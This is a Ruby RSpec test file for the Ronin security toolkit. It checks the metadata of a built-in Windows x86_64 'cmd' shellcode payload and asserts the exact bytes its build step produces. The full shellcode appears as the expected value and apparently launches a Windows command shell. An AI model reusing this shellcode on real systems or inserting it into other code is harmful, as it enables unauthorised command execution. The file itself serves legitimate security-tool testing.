require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/windows/x86_64/cmd'

describe Ronin::Payloads::Shellcode::Windows::X86_64::CMD do
  it "must inherit from Ronin::Payloads::ShellcodePayload" do
    expect(described_class).to be < Ronin::Payloads::ShellcodePayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/windows/x86_64/cmd'" do
      expect(subject.id).to eq('shellcode/windows/x86_64/cmd')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86_64" do
      expect(subject.arch).to be(:x86_64)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :windows" do
      expect(subject.os).to be(:windows)
    end
  end

  describe ".os_version" do
    subject { described_class }

    it "must equal '7'" do
      expect(subject.os_version).to eq('7')
    end
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x31\xC9\x64\x8B\x71\x30\x8B\x76\x0C\x8B\x76\x1C\x8B\x36\x8B\x06\x8B\x68\x08\xEB\x20\x5B\x53\x55\x5B\x81\xEB\x11\x11\x11\x11\x81\xC3\xDA\x3F\x1A\x11\xFF\xD3\x81\xC3\x11\x11\x11\x11\x81\xEB\x8C\xCC\x18\x11\xFF\xD3\xE8\xDB\xFF\xFF\xFF\x63\x6d\x64".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
